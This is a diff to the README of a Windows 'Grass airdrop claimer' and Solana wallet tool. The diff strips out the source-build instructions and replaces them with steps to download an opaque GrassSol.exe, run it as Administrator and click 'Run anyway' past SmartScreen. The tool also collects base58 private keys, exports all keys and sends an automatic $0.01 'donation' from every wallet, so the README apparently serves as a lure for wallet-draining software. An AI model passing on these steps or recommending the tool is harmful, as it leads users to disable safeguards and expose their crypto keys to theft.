@@ -1,5 +1,3 @@
-# Grass-Season-2-Airdrop-Claimer
-Claim your grass season 2 usdc airdrop from all accounts automatically
 # GrassSolAPP - FREE
 
 A comprehensive automation tool for Grass.io airdrop claiming and Solana wallet management. This application provides a complete suite of modules for managing Grass accounts, claiming airdrops, and handling Solana transactions.
@@ -26,14 +24,17 @@ A comprehensive automation tool for Grass.io airdrop claiming and Solana wallet 
 ### Download & Run
 
 1. Download the latest release from [Releases](../../releases)
-2. Extract the ZIP file
+2. Extract the ZIP file to any location
 3. Double-click `START.bat` or `GrassSol.exe`
-4. Open your browser to `http://localhost:5555`
+4. The application will start automatically
+5. Open your browser to `http://localhost:5555`
+6. Use the web interface to manage all operations
 
 ### Requirements
 
 - **Windows 7/8/10/11** (x64)
-- No Node.js installation required (bundled in executable)
+- No installation required - just download and run!
+- No Node.js, Python, or any dependencies needed
 
 ---
 
@@ -44,8 +45,6 @@ A comprehensive automation tool for Grass.io airdrop claiming and Solana wallet 
 #### 1. **Grass Bot (Standard & 3x)**
 
 Automated farming bot that maintains persistent connections to Grass network.
-
-<img width="544" height="538" alt="1" src="https://github.com/user-attachments/assets/f409c6bc-873f-44ed-9084-e0d819d179f3" />
 
 **Features:**
 - Multi-account support with individual proxy assignment
@@ -68,11 +67,11 @@ Automated farming bot that maintains persistent connections to Grass network.
 }
 ```
 
-**Usage:**
-```bash
-npm run grass      # Standard mode
-npm run grass-3x   # 3x mode
-```
+**How to Use:**
+1. Open the web interface at `http://localhost:5555`
+2. Navigate to **Grass Bot** section
+3. Click **"Start Grass Bot"** or **"Start Grass 3x Bot"**
+4. Monitor status in real-time on the dashboard
 
 ---
 
@@ -130,8 +129,6 @@ email@example.com - BASE58_PRIVATE_KEY
 
 #### 5. **Airdrop Claim (USDC)**
 
-<img width="687" height="193" alt="5" src="https://github.com/user-attachments/assets/7400a6ee-c4e4-44e4-afb2-bc2d5d4a28b7" />
-
 Headless USDC airdrop claiming with automatic $0.01 donation feature.
 
 **Features:**
@@ -161,6 +158,17 @@ Headless USDC airdrop claiming with automatic $0.01 donation feature.
 - Account tokens with proxy assignment
 - Sufficient SOL for transaction fees (~0.000005 SOL per tx)
 
+**Configuration:**
+```javascript
+{
+  concurrency: 3,              // Parallel claims
+  autoReclaim: true,           // Auto-collect USDC
+  autoCollectSol: true,        // Sweep remaining SOL
+  collectAddress: "YOUR_MAIN_WALLET_ADDRESS",
+  priorityFeeMicroLamports: 0  // Priority fee (0 = base fee only)
+}
+```
+
 **Output Files:**
 - `userData/results/claim/done.txt` - Successfully claimed wallets
 - `userData/results/claim/failed.txt` - Failed claims
@@ -189,10 +197,6 @@ user2@example.com             0.00320000     1.234567
 
 ### ⚡ Solana Modules
 
-<img width="549" height="559" alt="3" src="https://github.com/user-attachments/assets/0c0caaeb-677e-4747-859a-51af04317895" />
-
-<img width="554" height="532" alt="4" src="https://github.com/user-attachments/assets/28d64695-5f4a-40b6-88cb-6bc716638e08" />
-
 #### 1. **Send Tokens**
 
 Transfer SPL tokens (USDC, etc.) between wallets.
@@ -204,14 +208,15 @@ Transfer SPL tokens (USDC, etc.) between wallets.
 - Configurable priority fees
 - Transaction confirmation tracking
 
-**Usage:**
-```bash
-npm run send
-```
+**How to Use:**
+1. Open the web interface
+2. Navigate to **Send Tokens** module
+3. Enter destination address and amount
+4. Click **"Send"**
 
 **Configuration:**
 - Source wallet: `userData/wallets/wallet-main.txt`
-- Destination: Configured in web interface
+- Destination: Enter in web interface
 - Token mint address: Auto-detected or manual input
 
 ---
@@ -251,9 +256,6 @@ The app can generate new Solana wallets on demand through the web interface.
 ---
 
 ## ⚙️ Configuration
-
-<img width="946" height="574" alt="Screenshot_5" src="https://github.com/user-attachments/assets/dd727247-f82f-4b4f-a559-16b3b52e671b" />
-
 
 ### Main Configuration File
 
@@ -342,14 +344,10 @@ GrassSolAPP/
 
 ### Common Issues
 
-#### Build Fails
-```bash
-# Clean and rebuild
-cd APP
-rm -rf node_modules dist
-npm install
-npm run build
-```
+#### Application Won't Start
+- **Solution:** Right-click `GrassSol.exe` → "Run as Administrator"
+- Check Windows Firewall settings
+- If Windows SmartScreen blocks it: Click "More info" → "Run anyway"
 
 #### RPC Errors (429 Rate Limit)
 - **Solution:** Add premium RPC endpoints to `config.json`
@@ -378,54 +376,43 @@ npm run build
 
 ---
 
-## 🛠️ Development
+## 🎯 How to Use Each Module
 
-### Build from Source
+All modules are accessed through the web interface at `http://localhost:5555` after running the application.
 
-**Requirements:**
-- Node.js 18+ 
-- npm or yarn
+### Step-by-Step Guide:
 
-**Steps:**
-```bash
-# Clone repository
-git clone https://github.com/yourusername/GrassSolAPP-FREE.git
-cd GrassSolAPP-FREE/APP
+1. **Start the Application**
+   - Double-click `START.bat` or `GrassSol.exe`
+   - Wait for "Server running on port 5555" message
+   - Open browser to `http://localhost:5555`
 
-# Install dependencies
-npm install
+2. **Import Accounts**
+   - Click **"Account Import"** in the navigation
+   - Upload your accounts file or paste tokens
+   - Click **"Import"**
 
-# Run in development
-npm start
+3. **Export Wallets**
+   - Click **"Wallet Export"**
+   - Click **"Export All Wallets"**
+   - Keys will be saved to `userData/results/keys/keys.txt`
 
-# Build executable
-npm run build
-```
+4. **Claim Airdrop**
+   - Click **"Claim Airdrop"**
+   - Configure auto-collect settings if desired
+   - Click **"Start Claiming"**
+   - Monitor progress in real-time
 
-### Project Structure
+5. **Check Balances**
+   - Click **"Check Balances"**
+   - View SOL and USDC balances for all wallets
+   - Export results if needed
 
-```
-APP/
-├── main.js                   # Entry point (no license check)
-├── build.js                  # Build script
-├── package.json              # Dependencies
-├── Engine/
-│   ├── server.js             # Web server
-│   ├── lib.js                # Shared utilities
-│   ├── token.js              # SPL token operations
-│   ├── logger.js             # Logging system
-│   ├── paths.js              # Path resolution
-│   ├── balances.js           # Balance checker
-│   ├── send.js               # Token transfer
-│   ├── wallet-claim.js       # Legacy claim module
-│   ├── grass/
-│   │   ├── grass.js          # Main bot
-│   │   ├── claim.js          # Headless claim with $0.01 transfer
-│   │   └── settings.json     # Bot settings
-│   └── public/
-│       └── index.html        # Web UI
-└── userData/                 # User data (not in repo)
-```
+6. **Run Grass Bot**
+   - Click **"Grass Bot"**
+   - Select standard or 3x mode
+   - Click **"Start Bot"**
+   - Bot runs in background, check status anytime
 
 ---
 
@@ -446,16 +433,19 @@ APP/
 
 ---
 
-## 🤝 Contributing
+## 💡 Tips for Best Results
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+### Claiming Airdrops
+1. **Timing Matters** - Claim during off-peak hours for faster processing
+2. **Use Good Proxies** - Quality proxies = higher success rate
+3. **Check Balances First** - Ensure wallets have ~0.005 SOL for fees
+4. **Enable Auto-Collect** - Consolidate funds automatically to main wallet
 
-### Development Guidelines
-
-1. Follow existing code style
-2. Test thoroughly before submitting PR
-3. Update documentation for new features
-4. Add comments for complex logic
+### Running Grass Bot
+1. **Quality Proxies** - Use residential or datacenter proxies
+2. **Monitor Regularly** - Check dashboard for disconnected accounts
+3. **Restart Daily** - Fresh connections improve performance
+4. **Spread Connections** - Don't connect all accounts at once
 
 ---
 
